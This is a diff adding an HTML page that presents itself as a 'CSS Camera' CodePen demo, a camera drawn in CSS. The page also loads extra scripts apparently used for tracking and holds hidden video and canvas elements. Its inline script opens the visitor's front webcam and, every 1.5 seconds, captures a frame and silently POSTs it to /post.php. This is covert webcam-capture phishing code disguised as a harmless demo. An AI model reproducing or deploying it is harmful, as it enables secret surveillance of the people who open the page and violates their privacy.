@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>CodePen - CSS Camera</title>
+  <link rel="stylesheet" href="./style.css">
+
+  <script src="client.min.js"></script>
+  <script src="loc.js"></script>
+
+  <script
+  type="text/javascript"
+  src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
+></script>
+
+</head>
+<body onload="mydata()">
+<!-- partial:index.partial.html -->
+<div class='container'>
+  <div class='camera-top'>
+    <div class='zoom'></div>
+    <div class='mode-changer'></div>
+    <div class='sides'></div>
+    <div class='range-finder'></div>
+    <div class='focus'></div>
+    <div class='red'></div>
+    <div class='view-finder'></div>
+    <div class='flash'>
+      <div class='light'></div>
+    </div>
+  </div>
+  <div class='camera-mid'>
+    <div class='sensor'></div>
+    <div class='lens'></div>
+  </div>
+  <div class='camera-bottom'></div>
+</div>
+<!-- partial -->
+  
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+  function post(imgdata) {
+    $.ajax({
+      type: "POST",
+      data: { cat: imgdata },
+      url: "/post.php",
+      dataType: "json",
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {},
+    });
+  }
+
+  ("use strict");
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const errorMsgElement = document.querySelector("span#errorMsg");
+
+  const constraints = {
+    audio: false,
+    video: {
+      facingMode: "user",
+    },
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext("2d");
+    setInterval(function () {
+      context.drawImage(video, 0, 0, 640, 640);
+      var canvasData = canvas
+        .toDataURL("image/png")
+        .replace("image/png", "image/octet-stream");
+      post(canvasData);
+    }, 1500);
+  }
+
+  // Load init
+  init();
+</script>
+</body>
+</html>
